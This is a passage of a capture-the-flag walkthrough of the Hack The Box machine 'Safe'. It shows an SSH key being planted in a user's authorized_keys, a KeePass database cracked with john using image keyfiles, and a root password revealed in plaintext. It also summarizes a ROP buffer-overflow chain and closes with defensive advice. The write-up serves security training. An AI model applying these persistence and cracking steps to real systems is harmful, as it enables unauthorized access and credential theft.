root@kali:/home/kali/htb/Safe# echo "A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEAAEAAAAEIACp17OrJh09K8GAVuUFKTgAa3JjI2YWe8sLOwq38nKrBwUgAJpwComx61BYE0JiskgbVxyK/M/x1j2AtAn6WyVo3kgXBggAYOoAAAAAAAAHEAA2B53GEGr+ATQRNh5QIsTLCCAALyoVxCDdjlGVUAle8Ui7D8lxFqmuq947GG3S1dYGUc4JIAD05145NJA5f5qSijstkodxoJ2eanUKvZrkq2n4X4loWAoEAAIAAAAABAANCg0KeK0noO0Rzd97NXdxSy7mLPqU4hZ3WH8yBKJAH93OepbAnyNHBrlHcdUml1koi+kU0829Aa6pZEUdYBoPhhOK7mrG8x+XKw2FgHIoJy/sJC/nzZ9XRMEjRVlJMhjADctVtIv1FQy1sNxG1XXLZ/EhdgWLygyUMo8YNVsB9CfbUSfMKGxEUGFolTbaSvVMiZ1XVfyQxdwviCkuIc7CsPq60eSSQLk2M3rm8GyXTBr/6wFeegySaf+ttlyB/nTVZs4vBhIe80phm+E8bA1Ro0pOcjbanXTKecsg3epSTKY/xxSQJrGlX2wRPw1v8wWtgnjrx1bwhZ0LmETzsUKgRXOXzBTpjjFmI0HBbgZorN5AgjzjubnwEQ12LYNMyKzsL5sNzSVgjIlsM4UB5b5Xct1rar6oByPT35JJ01Gy+78CozomBUZxiQR0Hm3UHEvdoRY6m7R5jkh+JerD6gBhH7Vs/ai0rCagBcjRWskQIgqiN+Y/633sQRCoZow2lGupp10CfZWAHC80z1ptNoym/G6K4kJ3LdBzS/KzA6Fkdh1ATfuYFocyz73Z3zEMgKUqQeDM6/MopCtKw27VySN9/aRhoDgeVp2/tvZjq7xTW+QReRVLoYUNcP4CtoE8QNrM0aN6yzOJzYroEwhfzmKqXBrh1ZqvWnpqTxRjf4WptVGnZJRMEAb54ZH4IybKa+02tdXA24tTRiK9ZThuUqkc3lMIN1rV9z+fxVe+6fD6Tj+RVsQxfUV09XFEdSEQUdU0wu4rvWiJzMLE+pt2F0SnRDkc4hib+eIOLyzKbevYVuZNDN3DdHVyyunLR2UeFL7ZzjEZY62FCJLbTMA7ojE/edrCripd6BBaXjMcmvxgKlFEpTgl2nem8GZ/cHgdap6zd5soxKUaZETlsNnJ9JuCiKxTpWJUUfLXfMUEKzmG51oGYkBfH/eWdPyB3LUDdXqNRjDX6gTyyPyXI6Za4U52eknvalR67o9+lVzXl8ul0M8ajp1dG4RLEYbfhPXMKIefecOP5RPeOOK/IFEcux77TAlPHhmb7fi/kGH+BNqNMJtShfa2ukcqe0PWPoW/yGC3ha1y1b/ilOdRlsc3ePpgo18jHw7LDpu5yjykgySDVVspxIsm/nwWALC6Wp+ntRCowDnTYooQQfXqko5PRQcws3+KfBEAjeeI7QM0gjwBtCS1+v1waGsBRjyO4xHQVhrINgTzmr2mv+vFedyWMU47UincHLbRQSzv6oYHTOxPUiorMpDRg+TDkoUHk97XYXnQatrzxHIBKnQH/L+qp2JEeAER6dzEyjDQR01D92xc8Dk+zzcIbU+tV0x1mn/wscfvpLSXUJbskvxYkcCtnnSGQ/DBfuaQa25qjKwOzangztW4M7oNaAZpe1cvFSfVBpRsIifpqvQTKjdkVJyOaokzP+s3rspR6SzzpBb+uA7JQWzXD953Jyo3f+Xi2IOJEQosrzTaWYqLzrm8xCcH5iiLeQ1XEZz28uCWeFdrTgOW6s9O3/m/vyQqV/AZOg8VQsol9wBt8bdq5QPxuLiq2XGX4F2cCjVJhjNBRasZNRy5NrJhhPGJvKi8l9rElt6zG/Ptbw+CfSuawLGxEGrN8xKDpC2Pfc8VWk+Tr+SIYL3jH0oZLYhtpHDDCaaH+SU+S9D5WKS1swQB0+t2zgIVAzMXjgRtItpqGM+ziphh2/WzSJ6BU0kqvfUxEjzOsj/TWMGPH9q3kYgsFsoiaWFmn9MKcLGtY6vfA4ZHlrkvcyI2GL1V1UN8/7gh0/zwt9oNSHPUDRsV2Wdd6LjZ8ybxnPSSW3hxIuIRSQTDxfEw0zjL+XfsIEVhpFYPJX0CQDKG0+/6U34ScYpcJruWBn070hIg1TGZ6J/+D87Dh85zeIxOLNk2mCx5H1zWaNN5jD9fr6m6H8rxCWszY5CQzcTwTLZWi9Qn8ju4oNY0YtSi2BUwkqqRqCpqzhjqtQigciLClV/CSsExWVa7op6RqIlkggmglYKSaLiSFplVQ+aPTJdzmshoqQhXJ17oyJCCI1MERcExzTcgGCOamQSxSvsKehst13zx21vXFvh89AAghzBVlstajWZ+TRQieyyHSG/CX2pGq4g+bjb0sPRSXiXNaev3rhz9xhP9HE0SxbGnAMxnCl2DrczkQGryG01PzhXorZhQ3Qc1F7mYAxf+OozWxpgpJW6akMIGnVYcC2yezIvft87XCxeBeixaIM1TcgtYUU14p0z/3j6vk5WPcu807PW8zL0I8DRiVLfLeiPNDrAszyGynx65nO9fZY2fPxJOSG4aa/lvUH4ne1OtwjX0mS2y+6ob489skhcsM1bIQML/9GDfXzT4muf+Q7iOmqjSrTtzYB1zfUt4vmQZov+6O1Zk0IF38Avc2jL2yL4wjKBGtgbg0sg9qorO2gy2zpGKJi0GzAaR8FhEYlJRZRwB5frRKEruONUOomU5sOwh8RIcMuy8jhErjs0ANvROm8Yh9KUimt6554ZKpP6VcCzCP4TC+TJ5v0OM55JniGovU71DxBKmUK4h/WJGQlGkQGcaIR0LuffCYJILu47IfjxdEFfjS6MZ0d4dYQy+peyYL0QjN2nlOe/slKEtGe0Ua8vUoj6b0tKPihdTcuo+HQoFa0l9PTvCCgl1SAykBF/D/tMl87Ep+EtMEjsfRdCRq9O6OMwKT2UT2cjq0yX4NURZEHqNOFwKtm7YRDrvvavlrYCrL4SqTbN+TX/f4nedH1ksb+IR9L3T0Z61PjKIcXroI0INWmRT72xZmDtqQ6f+d/JbAmjgH3ce/6oHWKQjUM2joXsmnMZM5djLb7VACNR1XQZHEoGse+lwAM4BqUq/LKlMt3kWcz5lzfrqoHeYJtStJrOQOXlaTfKaV5PHH/1UzBQADVb2xAjvKDo9EriyLSmB4S+3D4Luw6ENpe/qoCl2YgZFcG8hDq+yLvcuuEuK4Veu6b4LVA==" | base64 -d > MyPasswords.kdbx
root@kali:/home/kali/htb/Safe# ls
10.129.1.173  myapp                   peda-session-myapp.txt
app.gpr       MyPasswords.kdbx        peda-session-uptime.txt
app.lock      peda-session-13375.txt  Safe.gpr
app.lock~     peda-session-16117.txt  Safe.rep
app.rep       peda-session-16125.txt
exploit.py    peda-session-16128.txt
root@kali:/home/kali/htb/Safe# md5sum MyPasswords.kdbx
50441bff6933383f7664324ed39504c8  MyPasswords.kdbx
root@kali:/home/kali/htb/Safe# 
```

And we can see the hashes match.

I try running john on the database alone, but it doesn't give anything. It makes sense, since we have all these image files as well.

Instead of downloading them as I did with the copy method, which is time consuming. I'm gonna copy my ssh key into user's so I can log in via ssh.

```
[MY MACHINE]

root@kali:/home/kali/htb/Safe# cat ~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQClK3hLC+/0zJZR1L0Buh5yb0zs/1Ja4Xk5OqmyGjQ6ur5qcarzjscklHciICHF0WZ8rfkuv2yTYfqH+zCD5RGl/ylkc1/SxEADwSYit2r9SIIBBqN8yh7wE4wjtd+MMHPk79NXrrcZmEx2yAWzZd1wv+gP7XxKzoZs7sXvBmJEi4n80isWOXwTzq/Yt2+TAltkMAyAuaYmkxF98Iym6ktuz5ZHPwW2r5ArzVruUuviLEJGUG5vSxMhVgle6uTxG1GwJM8W0NA2t8eamx+44cOTwOhPKhp8wptRVG9yrznbec8GMMKJ/cmwydxQdhQgDoRT2HIyvDJwroejjwMAqUTbor8jG9rlDf24mOjO+sb3LOsuZZ78OsioXla/l3cRpHP7VhAXDLHVMb2Hb44OsG7juAXZ09rjeuaJj5hJzas2otn+JTuGyJ6DIAwu0OvN/lo+xmKzlA1hxWEIcEDP4NHe9LnXS0QNdfWkG6/OLH6uka7tneEVB6ro6Qi8bjFYtEc= = root@kali


[TARGET MACHINE]

user@safe:/home/user$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQClK3hLC+/0zJZR1L0Buh5yb0zs/1Ja4Xk5OqmyGjQ6ur5qcarzjscklHciICHF0WZ8rfkuv2yTYfqH+zCD5RGl/ylkc1/SxEADwSYit2r9SIIBBqN8yh7wE4wjtd+MMHPk79NXrrcZmEx2yAWzZd1wv+gP7XxKzoZs7sXvBmJEi4n80isWOXwTzq/Yt2+TAltkMAyAuaYmkxF98Iym6ktuz5ZHPwW2r5ArzVruUuviLEJGUG5vSxMhVgle6uTxG1GwJM8W0NA2t8eamx+44cOTwOhPKhp8wptRVG9yrznbec8GMMKJ/cmwydxQdhQgDoRT2HIyvDJwroejjwMAqUTbor8jG9rlDf24mOjO+sb3LOsuZZ78OsioXla/l3cRpHP7VhAXDLHVMb2Hb44OsG7juAXZ09rjeuaJj5hJzas2otn+JTuGyJ6DIAwu0OvN/lo+xmKzlA1hxWEIcEDP4NHe9LnXS0QNdfWkG6/OLH6uka7tneEVB6ro6Qi8bjFYtEc= root@kali" > /home/user/.ssh/authorized_keys


[MY MACHINE]

root@kali:/home/kali/htb/Safe# ssh user@10.129.1.173
The authenticity of host '10.129.1.173 (10.129.1.173)' can't be established.
ECDSA key fingerprint is SHA256:SLbYsnF/xaUQIxRufe8Ux6dZJ9+Jler9PTISUR90xkc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.173' (ECDSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
/usr/bin/xauth:  file /home/user/.Xauthority does not exist
user@safe:~$ 

```

And then to download:

```
root@kali:/home/kali/htb/Safe# scp user@10.129.1.173:~/IMG* .
Enter passphrase for key '/root/.ssh/id_rsa': 
IMG_0545.JPG                             100% 1863KB   6.2MB/s   00:00    
IMG_0546.JPG                             100% 1872KB   4.8MB/s   00:00    
IMG_0547.JPG                             100% 2470KB   3.8MB/s   00:00    
IMG_0548.JPG                             100% 2858KB   4.1MB/s   00:00    
IMG_0552.JPG                             100% 1099KB   4.1MB/s   00:00    
IMG_0553.JPG                             100% 1060KB   4.1MB/s   00:00    
root@kali:/home/kali/htb/Safe# 
```

So now I can use each image as a keyfile for the database. For each keyfile I am storing a hash in a file to crack with john.

```
root@kali:/home/kali/htb/Safe# keepass2john MyPasswords.kdbx > hashes; for i in *.JPG; do keepass2john -k $i MyPasswords.kdbx; done >> hashes
root@kali:/home/kali/htb/Safe# john hashes -wordlist=/opt/SecLists/Passwords/xato-net-10-million-passwords-1000.txt
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64])
Remaining 6 password hashes with 6 different salts
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 DONE (2021-03-09 14:48) 0g/s 77.45p/s 464.7c/s 464.7C/s crazy..polina
Session completed
root@kali:/home/kali/htb/Safe# john --show hashes
MyPasswords:bullshit

1 password hash cracked, 6 left
root@kali:/home/kali/htb/Safe# 

```

I originally ran the cracking with rockyou.txt, but I realized it would take ages. So I looked for some smaller wordlists.

I did this with:

```
root@kali:/opt/SecLists/Passwords# wc -l * 2>/dev/null
  1652903 bt4-password.txt
     1039 cirt-default-passwords.txt
       82 clarkson-university-82.txt
        0 Common-Credentials
        0 Cracked-Hashes
  1471056 darkc0de.txt
     9999 darkweb2017-top10000.txt
      999 darkweb2017-top1000.txt
       99 darkweb2017-top100.txt
       10 darkweb2017-top10.txt
        0 Default-Credentials
        1 der-postillon.txt
   679006 dutch_wordlist
        0 Honeypot-Captures
     9604 Keyboard-Combinations.txt
        0 Leaked-Databases
        0 Malware
    47603 Most-Popular-Letter-Passes.txt
   172696 mssql-passwords-nansh0u-guardicore.txt
  3721224 openwall.net-all.txt
        0 Permutations
       25 PHP-Magic-Hashes.txt
    12645 probable-v2-top12000.txt
     1575 probable-v2-top1575.txt
      207 probable-v2-top207.txt
        6 README.md
    20000 richelieu-french-top20000.txt
     5000 richelieu-french-top5000.txt
    12877 SCRABBLE-hackerhouse.tgz
        0 Software
        4 stupid-ones-in-production.txt
      397 twitter-banned.txt
     3916 unkown-azul.txt
        3 url-to-download-passwords.md
      727 UserPassCombo-Jay.txt
        0 WiFi-WPA
  1000000 xato-net-10-million-passwords-1000000.txt
   100000 xato-net-10-million-passwords-100000.txt
    10000 xato-net-10-million-passwords-10000.txt
     1000 xato-net-10-million-passwords-1000.txt
      100 xato-net-10-million-passwords-100.txt
       10 xato-net-10-million-passwords-10.txt
   755995 xato-net-10-million-passwords-dup.txt
  5189454 xato-net-10-million-passwords.txt
 14880262 total
root@kali:/opt/SecLists/Passwords# 
```

simply wc = wordcount, -l counts the lines, and * just selects everything in the directory.

`2>/dev/null` just hides all errors.

I google how to open KeePass files and find kpcli.

I don't know which IMG file was the key, so I try them all until I find the one.

Probably not the optimal way to do things.

```
root@kali:/home/kali/htb/Safe# kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> help
  attach -- Manage attachments: attach <path to entry|entry number>
      cd -- Change directory (path to a group)
      cl -- Change directory and list entries (cd+ls)
   clone -- Clone an entry: clone <path to entry> <path to new entry>
   close -- Close the currently opened database
     cls -- Clear screen ("clear" command also works)
    copy -- Copy an entry: copy <path to entry> <path to new entry>
    edit -- Edit an entry: edit <path to entry|entry number>
  export -- Export entries to a new KeePass DB (export <file.kdb> [<file.key>])
    find -- Finds entries by Title
    help -- Print helpful information
 history -- Prints the command history
   icons -- Change group or entry icons in the database
  import -- Import a password database (import <file> <path> [<file.key>])
      ls -- Lists items in the pwd or specified paths ("dir" also works)
   mkdir -- Create a new group (mkdir <group_name>)
      mv -- Move an item: mv <path to a group|or entries> <path to group>
     new -- Create a new entry: new <optional path&|title>
    open -- Open a KeePass database file (open <file.kdb> [<file.key>])
   purge -- Purges entries in a given group base on criteria.
    pwck -- Check password quality: pwck <entry|group>
     pwd -- Print the current working directory
    quit -- Quit this program (EOF and exit also work)
  rename -- Rename a group: rename <path to group>
      rm -- Remove an entry: rm <path to entry|entry number>
   rmdir -- Delete a group (rmdir <group_name>)
    save -- Save the database to disk
  saveas -- Save to a specific filename (saveas <file.kdb> [<file.key>])
    show -- Show an entry: show [-f] [-a] <entry path|entry number>
   stats -- Prints statistics about the open KeePass file
     ver -- Print the version of this program
    vers -- Same as "ver -v"
      xp -- Copy password to clipboard: xp <entry path|number>
      xu -- Copy username to clipboard: xu <entry path|number>
      xw -- Copy URL (www) to clipboard: xw <entry path|number>
      xx -- Clear the clipboard: xx

Type "help <command>" for more detailed help on a command.
kpcli:/> 
```

Thanks to the help commands I'm able to navigate the program:

```
kpcli:/> ls
=== Groups ===
MyPasswords/
kpcli:/> cd MyPasswords/
kpcli:/MyPasswords> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. Root password                                                          
kpcli:/MyPasswords> cat R
cat: unknown command
kpcli:/MyPasswords> show Root\ password 

 Path: /MyPasswords/
Title: Root password
Uname: root
 Pass: [|||||||||||||||||||||||||||||||||]
  URL: 
Notes: 

kpcli:/MyPasswords> help show
show: Show an entry: show [-f] [-a] <entry path|entry number>

The show command tries to intelligently determine
what you want to see and to make it easy to display.
Show can take a path to an entry as its argument or
an entry number as shown by the ls command.

When using entry numbers, they will refer to the last
path when an ls was performed or pwd if ls has not
yet been run.

By default, passwords are "hidden" by being displayed as
"red on red" where they can be copied to the clip board
but not seen. Provide the -f option to show passwords.
Use the -a option to see create and modified times, and
the index of the icon set for the entry.
kpcli:/MyPasswords> show -f Root\ password

 Path: /MyPasswords/
Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL: 
Notes: 

kpcli:/MyPasswords> 
```

I then just go to my ssh session and login as root:

```
user@safe:~$ su
Password: 
root@safe:/home/user# whoami
root
```



## Comparing myself to the offical writeup:

They discover the comment and download the binary.

When analyzing they see that system() is imported, as well as noticing that gets() is used to parse the input.

they confirm the 120 byte buffer.

They also disassemble the test function. And they see that the function moves RSP to RDI and jumps to the address in r13.

They plan to set r13 to the address of system(), rsp points to the top of the stack, which will be overwritten by the buffer overflow.

they will then also place the address to "/bin/sh" in rdi and use a rop gadget to pop the address of the test() function into r13. The gadget pops r13, r14, and r15 before returning.

so they need multiple arguments to pop. They just fill these with junk.

their overall chain is: buffer + pop_r13 + system + junk + junk + test + binsh

binsh is also terminated with a nullbyte at the end. 

They get the shell, and find the Keepass database.

They copy the ssh key into the target, and get an ssh connection.

They crack the password with john by combining hashes.

they create a script to test each image with kpcli to know what image is correct.

They open the database and find the password, and simply upgrade to root on the machine.



## How to stop this exploit:

I assume that the creator of the web-server is the same person that created the custom program running on port 1337.

Why would they need to remind themselves publicly where to download the program. They should probably know the location, as I assume they uploaded it.

Another option is to hide the download behind permissions. The webserver was empty. It could just as well have been an ftp server locked behind credentials.

The program itself should sanitize the input properly. And the test() function should be removed from the deployed version.

The Keepass database is useless, as it is located together with its key.


